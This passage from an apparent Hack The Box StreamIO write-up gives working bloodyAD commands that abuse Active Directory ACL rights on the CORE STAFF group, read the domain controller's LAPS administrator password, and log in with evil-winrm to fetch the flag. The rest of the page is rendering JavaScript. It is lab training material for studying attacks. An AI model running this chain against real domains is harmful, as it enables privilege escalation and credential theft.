<p>In BloodHound we saw that <code>JDGODD</code> had <code>WriteOwner</code> rights to the group <code>CORE STAFF@STREAMIO.HTB</code>. Looking on the ACL attack graph, below, we need to change the rights to <code>WriteDACL</code> and then <code>GenericAll</code>. <br> With <code>GenericAll</code> we are allowed to add members to a group, and in this case we saw earlier that <code>CORE STAFF</code> group is allowed to read LAPS password - meaning Administrator access.</p>
<p><img src="../../assets/images/acl-attack-graph.png" class="img-fluid"></p>
<p><img src="images/streamio03.png" class="img-fluid"></p>
<div class="sourceCode" id="cb25"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb25-1"><a href="#cb25-1" aria-hidden="true" tabindex="-1"></a><span class="co">## Get WriteDACL</span></span>
<span id="cb25-2"><a href="#cb25-2" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  bloodyAD git:<span class="er">(</span><span class="ex">main</span><span class="kw">)</span> <span class="ex">./bloodyAD.py</span> <span class="at">-d</span> streamio.htb <span class="at">-u</span> jdgodd <span class="at">-p</span> <span class="st">"JDg0dd1s@d0p3cr3@t0r"</span> <span class="at">--host</span> 10.10.11.158 setOwner JDGODD <span class="st">"CORE STAFF"</span></span>
<span id="cb25-3"><a href="#cb25-3" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> JDGODD SID is: S-1-5-21-1470860369-1569627196-4264678630-1104</span>
<span id="cb25-4"><a href="#cb25-4" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Old owner S-1-5-21-1470860369-1569627196-4264678630-1104 is now replaced by JDGODD on CORE STAFF</span>
<span id="cb25-5"><a href="#cb25-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb25-6"><a href="#cb25-6" aria-hidden="true" tabindex="-1"></a><span class="co">## GenericAll</span></span>
<span id="cb25-7"><a href="#cb25-7" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  bloodyAD git:<span class="er">(</span><span class="ex">main</span><span class="kw">)</span> <span class="ex">./bloodyAD.py</span> <span class="at">-d</span> streamio.htb <span class="at">-u</span> jdgodd <span class="at">-p</span> <span class="st">"JDg0dd1s@d0p3cr3@t0r"</span> <span class="at">--host</span> 10.10.11.158 setGenericAll JDGODD <span class="st">"CORE STAFF"</span></span>
<span id="cb25-8"><a href="#cb25-8" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> JDGODD SID is: S-1-5-21-1470860369-1569627196-4264678630-1104</span>
<span id="cb25-9"><a href="#cb25-9" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> JDGODD can now write the attributes of CORE STAFF</span>
<span id="cb25-10"><a href="#cb25-10" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb25-11"><a href="#cb25-11" aria-hidden="true" tabindex="-1"></a><span class="co">## Add JDGODD to Core Staff group</span></span>
<span id="cb25-12"><a href="#cb25-12" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  bloodyAD git:<span class="er">(</span><span class="ex">main</span><span class="kw">)</span> <span class="ex">./bloodyAD.py</span> <span class="at">-d</span> streamio.htb <span class="at">-u</span> jdgodd <span class="at">-p</span> <span class="st">"JDg0dd1s@d0p3cr3@t0r"</span> <span class="at">--host</span> 10.10.11.158 getObjectAttributes  <span class="st">"CORE STAFF"</span> member</span>
<span id="cb25-13"><a href="#cb25-13" aria-hidden="true" tabindex="-1"></a><span class="kw">{</span></span>
<span id="cb25-14"><a href="#cb25-14" aria-hidden="true" tabindex="-1"></a>    <span class="st">"member"</span><span class="ex">:</span> []</span>
<span id="cb25-15"><a href="#cb25-15" aria-hidden="true" tabindex="-1"></a><span class="kw">}</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p><img src="images/streamio04.png" class="img-fluid"></p>
<div class="sourceCode" id="cb26"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb26-1"><a href="#cb26-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  bloodyAD git:<span class="er">(</span><span class="ex">main</span><span class="kw">)</span> <span class="ex">./bloodyAD.py</span> <span class="at">-d</span> streamio.htb <span class="at">-u</span> jdgodd <span class="at">-p</span> <span class="st">"JDg0dd1s@d0p3cr3@t0r"</span> <span class="at">--host</span> 10.10.11.158 addObjectToGroup JDGODD <span class="st">"CORE STAFF"</span></span>
<span id="cb26-2"><a href="#cb26-2" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> JDGODD found at CN=JDgodd,CN=Users,DC=streamIO,DC=htb</span>
<span id="cb26-3"><a href="#cb26-3" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> CORE STAFF found at CN=CORE STAFF,CN=Users,DC=streamIO,DC=htb</span>
<span id="cb26-4"><a href="#cb26-4" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> CN=JDgodd,CN=Users,DC=streamIO,DC=htb added to CN=CORE STAFF,CN=Users,DC=streamIO,DC=htb</span>
<span id="cb26-5"><a href="#cb26-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb26-6"><a href="#cb26-6" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  bloodyAD git:<span class="er">(</span><span class="ex">main</span><span class="kw">)</span> <span class="ex">./bloodyAD.py</span> <span class="at">-d</span> streamio.htb <span class="at">-u</span> jdgodd <span class="at">-p</span> <span class="st">"JDg0dd1s@d0p3cr3@t0r"</span> <span class="at">--host</span> 10.10.11.158 getObjectAttributes  <span class="st">"CORE STAFF"</span> member</span>
<span id="cb26-7"><a href="#cb26-7" aria-hidden="true" tabindex="-1"></a><span class="kw">{</span></span>
<span id="cb26-8"><a href="#cb26-8" aria-hidden="true" tabindex="-1"></a>    <span class="st">"member"</span><span class="ex">:</span> [</span>
<span id="cb26-9"><a href="#cb26-9" aria-hidden="true" tabindex="-1"></a>        <span class="st">"CN=JDgodd,CN=Users,DC=streamIO,DC=htb"</span></span>
<span id="cb26-10"><a href="#cb26-10" aria-hidden="true" tabindex="-1"></a>    <span class="ex">]</span></span>
<span id="cb26-11"><a href="#cb26-11" aria-hidden="true" tabindex="-1"></a><span class="kw">}</span></span>
<span id="cb26-12"><a href="#cb26-12" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb26-13"><a href="#cb26-13" aria-hidden="true" tabindex="-1"></a><span class="co">## Read LAPS Password</span></span>
<span id="cb26-14"><a href="#cb26-14" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  bloodyAD git:<span class="er">(</span><span class="ex">main</span><span class="kw">)</span> <span class="ex">./bloodyAD.py</span> <span class="at">-d</span> streamio <span class="at">-u</span> jdgodd <span class="at">-p</span> <span class="st">"JDg0dd1s@d0p3cr3@t0r"</span> <span class="at">--host</span> 10.10.11.158 getObjectAttributes dc$ ms-mcs-admpwd </span>
<span id="cb26-15"><a href="#cb26-15" aria-hidden="true" tabindex="-1"></a><span class="kw">{</span></span>
<span id="cb26-16"><a href="#cb26-16" aria-hidden="true" tabindex="-1"></a>    <span class="st">"ms-Mcs-AdmPwd"</span><span class="ex">:</span> <span class="st">"#J</span><span class="va">$FRGC</span><span class="st">-6446b3"</span></span>
<span id="cb26-17"><a href="#cb26-17" aria-hidden="true" tabindex="-1"></a><span class="kw">}</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Login as Administrator and grab root.txt.</p>
<div class="sourceCode" id="cb27"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb27-1"><a href="#cb27-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  streamio evil-winrm <span class="at">-i</span> 10.10.11.158 <span class="at">-u</span> Administrator <span class="at">-p</span> <span class="st">'#J$FRGC-6446b3'</span></span>
<span id="cb27-2"><a href="#cb27-2" aria-hidden="true" tabindex="-1"></a><span class="ex">*Evil-WinRM*</span> PS C:<span class="dt">\U</span>sers<span class="dt">\M</span>artin<span class="dt">\D</span>esktop<span class="op">&gt;</span> cat root.txt</span>
<span id="cb27-3"><a href="#cb27-3" aria-hidden="true" tabindex="-1"></a><span class="ex">8e096689d3272326aa70edf422e01127</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<hr>
</section>
</section>
<section id="referenses" class="level1">
<h1>Referenses</h1>
<p>MsSQL SELECT:<br> https://docs.microsoft.com/en-us/sql/t-sql/queries/select-examples-transact-sql?view=sql-server-ver16</p>
<p>MsSQL Concat: <br> https://www.sqlservertutorial.net/sql-server-string-functions/sql-server-concat_ws-function/#:~:text=The%20SQL%20Server%20CONCAT_WS()%20function%20concatenates%20two%20or%20more,()%20means%20concatenate%20with%20separator.&amp;text=In%20this%20syntax%3A,NCHAR%20%2C%20VARCHAR%20%2C%20or%20NVARCHAR%20.</p>


</section>

</main> <!-- /main -->
<script id="quarto-html-after-body" type="application/javascript">
window.document.addEventListener("DOMContentLoaded", function (event) {
  const toggleBodyColorMode = (bsSheetEl) => {
    const mode = bsSheetEl.getAttribute("data-mode");
    const bodyEl = window.document.querySelector("body");
    if (mode === "dark") {
      bodyEl.classList.add("quarto-dark");
      bodyEl.classList.remove("quarto-light");
    } else {
      bodyEl.classList.add("quarto-light");
      bodyEl.classList.remove("quarto-dark");
    }
  }
  const toggleBodyColorPrimary = () => {
    const bsSheetEl = window.document.querySelector("link#quarto-bootstrap");
    if (bsSheetEl) {
      toggleBodyColorMode(bsSheetEl);
    }
  }
  toggleBodyColorPrimary();  
  const icon = "";
  const anchorJS = new window.AnchorJS();
  anchorJS.options = {
    placement: 'right',
    icon: icon
  };
  anchorJS.add('.anchored');
  const isCodeAnnotation = (el) => {
    for (const clz of el.classList) {
      if (clz.startsWith('code-annotation-')) {                     
        return true;
      }
    }
    return false;
  }
  const onCopySuccess = function(e) {
    // button target
    const button = e.trigger;
    // don't keep focus
    button.blur();
    // flash "checked"
    button.classList.add('code-copy-button-checked');
    var currentTitle = button.getAttribute("title");
    button.setAttribute("title", "Copied!");
    let tooltip;
    if (window.bootstrap) {
      button.setAttribute("data-bs-toggle", "tooltip");
      button.setAttribute("data-bs-placement", "left");
      button.setAttribute("data-bs-title", "Copied!");
      tooltip = new bootstrap.Tooltip(button, 
        { trigger: "manual", 
          customClass: "code-copy-button-tooltip",
          offset: [0, -8]});
      tooltip.show();    
    }
    setTimeout(function() {
      if (tooltip) {
        tooltip.hide();
        button.removeAttribute("data-bs-title");
        button.removeAttribute("data-bs-toggle");
        button.removeAttribute("data-bs-placement");
      }
      button.setAttribute("title", currentTitle);
      button.classList.remove('code-copy-button-checked');
    }, 1000);
    // clear code selection
    e.clearSelection();
  }
  const getTextToCopy = function(trigger) {
      const codeEl = trigger.previousElementSibling.cloneNode(true);
      for (const childEl of codeEl.children) {
        if (isCodeAnnotation(childEl)) {
          childEl.remove();
        }
      }
      return codeEl.innerText;
  }
  const clipboard = new window.ClipboardJS('.code-copy-button:not([data-in-quarto-modal])', {
    text: getTextToCopy
  });
  clipboard.on('success', onCopySuccess);
  if (window.document.getElementById('quarto-embedded-source-code-modal')) {
    // For code content inside modals, clipBoardJS needs to be initialized with a container option
    // TODO: Check when it could be a function (https://github.com/zenorocha/clipboard.js/issues/860)
    const clipboardModal = new window.ClipboardJS('.code-copy-button[data-in-quarto-modal]', {
      text: getTextToCopy,
      container: window.document.getElementById('quarto-embedded-source-code-modal')
    });
    clipboardModal.on('success', onCopySuccess);
  }
    var localhostRegex = new RegExp(/^(?:http|https):\/\/localhost\:?[0-9]*\//);
    var mailtoRegex = new RegExp(/^mailto:/);
      var filterRegex = new RegExp("https:\/\/exploit\.se");
    var isInternal = (href) => {
        return filterRegex.test(href) || localhostRegex.test(href) || mailtoRegex.test(href);
    }
    // Inspect non-navigation links and adorn them if external
 	var links = window.document.querySelectorAll('a[href]:not(.nav-link):not(.navbar-brand):not(.toc-action):not(.sidebar-link):not(.sidebar-item-toggle):not(.pagination-link):not(.no-external):not([aria-hidden]):not(.dropdown-item):not(.quarto-navigation-tool):not(.about-link)');
    for (var i=0; i<links.length; i++) {
      const link = links[i];
      if (!isInternal(link.href)) {
        // undo the damage that might have been done by quarto-nav.js in the case of
        // links that we want to consider external
        if (link.dataset.originalHref !== undefined) {
          link.href = link.dataset.originalHref;
        }
      }
    }
  function tippyHover(el, contentFn, onTriggerFn, onUntriggerFn) {
    const config = {
      allowHTML: true,
      maxWidth: 500,
      delay: 100,
      arrow: false,
      appendTo: function(el) {
          return el.parentElement;
      },
      interactive: true,
      interactiveBorder: 10,
      theme: 'quarto',
      placement: 'bottom-start',
    };
    if (contentFn) {
      config.content = contentFn;
    }
    if (onTriggerFn) {
      config.onTrigger = onTriggerFn;
    }
    if (onUntriggerFn) {
      config.onUntrigger = onUntriggerFn;
    }
    window.tippy(el, config); 
  }
  const noterefs = window.document.querySelectorAll('a[role="doc-noteref"]');
  for (var i=0; i<noterefs.length; i++) {
    const ref = noterefs[i];
    tippyHover(ref, function() {
      // use id or data attribute instead here
      let href = ref.getAttribute('data-footnote-href') || ref.getAttribute('href');
      try { href = new URL(href).hash; } catch {}
      const id = href.replace(/^#\/?/, "");
      const note = window.document.getElementById(id);
      if (note) {
        return note.innerHTML;
      } else {
        return "";
      }
    });
  }
  const xrefs = window.document.querySelectorAll('a.quarto-xref');
  const processXRef = (id, note) => {
    // Strip column container classes
    const stripColumnClz = (el) => {
      el.classList.remove("page-full", "page-columns");
      if (el.children) {
        for (const child of el.children) {
          stripColumnClz(child);
        }
      }
    }
    stripColumnClz(note)
    if (id === null || id.startsWith('sec-')) {
      // Special case sections, only their first couple elements
      const container = document.createElement("div");
      if (note.children && note.children.length > 2) {
        container.appendChild(note.children[0].cloneNode(true));
        for (let i = 1; i < note.children.length; i++) {
          const child = note.children[i];
          if (child.tagName === "P" && child.innerText === "") {
            continue;
          } else {
            container.appendChild(child.cloneNode(true));
            break;
          }
        }
        if (window.Quarto?.typesetMath) {
          window.Quarto.typesetMath(container);
        }
        return container.innerHTML
      } else {
        if (window.Quarto?.typesetMath) {
          window.Quarto.typesetMath(note);
        }
        return note.innerHTML;
      }
    } else {
      // Remove any anchor links if they are present
      const anchorLink = note.querySelector('a.anchorjs-link');
      if (anchorLink) {
        anchorLink.remove();
      }
      if (window.Quarto?.typesetMath) {
        window.Quarto.typesetMath(note);
      }
      // TODO in 1.5, we should make sure this works without a callout special case
      if (note.classList.contains("callout")) {
        return note.outerHTML;
      } else {
        return note.innerHTML;
      }
    }
  }
  for (var i=0; i<xrefs.length; i++) {
    const xref = xrefs[i];
    tippyHover(xref, undefined, function(instance) {
      instance.disable();
      let url = xref.getAttribute('href');
      let hash = undefined; 
      if (url.startsWith('#')) {
        hash = url;
      } else {
        try { hash = new URL(url).hash; } catch {}
      }
      if (hash) {
        const id = hash.replace(/^#\/?/, "");
        const note = window.document.getElementById(id);
        if (note !== null) {
          try {
            const html = processXRef(id, note.cloneNode(true));
            instance.setContent(html);
          } finally {
            instance.enable();
            instance.show();
          }
        } else {
          // See if we can fetch this
          fetch(url.split('#')[0])
          .then(res => res.text())
          .then(html => {
            const parser = new DOMParser();
            const htmlDoc = parser.parseFromString(html, "text/html");
            const note = htmlDoc.getElementById(id);
            if (note !== null) {
              const html = processXRef(id, note);
              instance.setContent(html);
            } 
          }).finally(() => {
            instance.enable();
            instance.show();
          });
        }
      } else {
        // See if we can fetch a full url (with no hash to target)
        // This is a special case and we should probably do some content thinning / targeting
        fetch(url)
        .then(res => res.text())
        .then(html => {
          const parser = new DOMParser();
          const htmlDoc = parser.parseFromString(html, "text/html");
          const note = htmlDoc.querySelector('main.content');
          if (note !== null) {
            // This should only happen for chapter cross references
            // (since there is no id in the URL)
            // remove the first header
            if (note.children.length > 0 && note.children[0].tagName === "HEADER") {
              note.children[0].remove();
            }
            const html = processXRef(null, note);
            instance.setContent(html);
          } 
        }).finally(() => {
          instance.enable();
          instance.show();
        });
      }
    }, function(instance) {
    });
  }
      let selectedAnnoteEl;
      const selectorForAnnotation = ( cell, annotation) => {
        let cellAttr = 'data-code-cell="' + cell + '"';
        let lineAttr = 'data-code-annotation="' +  annotation + '"';
        const selector = 'span[' + cellAttr + '][' + lineAttr + ']';
        return selector;
      }
      const selectCodeLines = (annoteEl) => {
        const doc = window.document;
        const targetCell = annoteEl.getAttribute("data-target-cell");
        const targetAnnotation = annoteEl.getAttribute("data-target-annotation");
        const annoteSpan = window.document.querySelector(selectorForAnnotation(targetCell, targetAnnotation));
        const lines = annoteSpan.getAttribute("data-code-lines").split(",");
        const lineIds = lines.map((line) => {
          return targetCell + "-" + line;
        })
        let top = null;
        let height = null;
        let parent = null;
        if (lineIds.length > 0) {
            //compute the position of the single el (top and bottom and make a div)
            const el = window.document.getElementById(lineIds[0]);
            top = el.offsetTop;
            height = el.offsetHeight;
            parent = el.parentElement.parentElement;
          if (lineIds.length > 1) {
            const lastEl = window.document.getElementById(lineIds[lineIds.length - 1]);
            const bottom = lastEl.offsetTop + lastEl.offsetHeight;
            height = bottom - top;
          }
          if (top !== null && height !== null && parent !== null) {
            // cook up a div (if necessary) and position it 
            let div = window.document.getElementById("code-annotation-line-highlight");
            if (div === null) {
              div = window.document.createElement("div");
              div.setAttribute("id", "code-annotation-line-highlight");
              div.style.position = 'absolute';
              parent.appendChild(div);
            }
            div.style.top = top - 2 + "px";
            div.style.height = height + 4 + "px";
            div.style.left = 0;
            let gutterDiv = window.document.getElementById("code-annotation-line-highlight-gutter");
            if (gutterDiv === null) {
              gutterDiv = window.document.createElement("div");
              gutterDiv.setAttribute("id", "code-annotation-line-highlight-gutter");
              gutterDiv.style.position = 'absolute';
              const codeCell = window.document.getElementById(targetCell);
              const gutter = codeCell.querySelector('.code-annotation-gutter');
              gutter.appendChild(gutterDiv);
            }
            gutterDiv.style.top = top - 2 + "px";
            gutterDiv.style.height = height + 4 + "px";
          }
          selectedAnnoteEl = annoteEl;
        }
      };
      const unselectCodeLines = () => {
        const elementsIds = ["code-annotation-line-highlight", "code-annotation-line-highlight-gutter"];
        elementsIds.forEach((elId) => {
          const div = window.document.getElementById(elId);
          if (div) {
            div.remove();
          }
        });
        selectedAnnoteEl = undefined;
      };
        // Handle positioning of the toggle
    window.addEventListener(
      "resize",
      throttle(() => {
        elRect = undefined;
        if (selectedAnnoteEl) {
          selectCodeLines(selectedAnnoteEl);
        }
      }, 10)
    );
    function throttle(fn, ms) {
    let throttle = false;
    let timer;
      return (...args) => {
        if(!throttle) { // first call gets through
            fn.apply(this, args);
            throttle = true;
        } else { // all the others get throttled
            if(timer) clearTimeout(timer); // cancel #2
            timer = setTimeout(() => {
              fn.apply(this, args);
              timer = throttle = false;
            }, ms);
        }
      };
    }
      // Attach click handler to the DT
      const annoteDls = window.document.querySelectorAll('dt[data-target-cell]');
      for (const annoteDlNode of annoteDls) {
        annoteDlNode.addEventListener('click', (event) => {
          const clickedEl = event.target;
          if (clickedEl !== selectedAnnoteEl) {
            unselectCodeLines();
            const activeEl = window.document.querySelector('dt[data-target-cell].code-annotation-active');
            if (activeEl) {
              activeEl.classList.remove('code-annotation-active');
            }
            selectCodeLines(clickedEl);
            clickedEl.classList.add('code-annotation-active');
          } else {
            // Unselect the line
            unselectCodeLines();
            clickedEl.classList.remove('code-annotation-active');
          }
        });
      }
  const findCites = (el) => {
    const parentEl = el.parentElement;
    if (parentEl) {
      const cites = parentEl.dataset.cites;
      if (cites) {
        return {
          el,
          cites: cites.split(' ')
        };
      } else {
        return findCites(el.parentElement)
      }
    } else {
      return undefined;
    }
  };
  var bibliorefs = window.document.querySelectorAll('a[role="doc-biblioref"]');
  for (var i=0; i<bibliorefs.length; i++) {
    const ref = bibliorefs[i];
    const citeInfo = findCites(ref);
    if (citeInfo) {
      tippyHover(citeInfo.el, function() {
        var popup = window.document.createElement('div');
        citeInfo.cites.forEach(function(cite) {
          var citeDiv = window.document.createElement('div');
          citeDiv.classList.add('hanging-indent');
          citeDiv.classList.add('csl-entry');
          var biblioDiv = window.document.getElementById('ref-' + cite);
          if (biblioDiv) {
            citeDiv.innerHTML = biblioDiv.innerHTML;
          }
          popup.appendChild(citeDiv);
        });
        return popup.innerHTML;
      });
    }
  }
});
</script>
</div> <!-- /content -->




</body></html>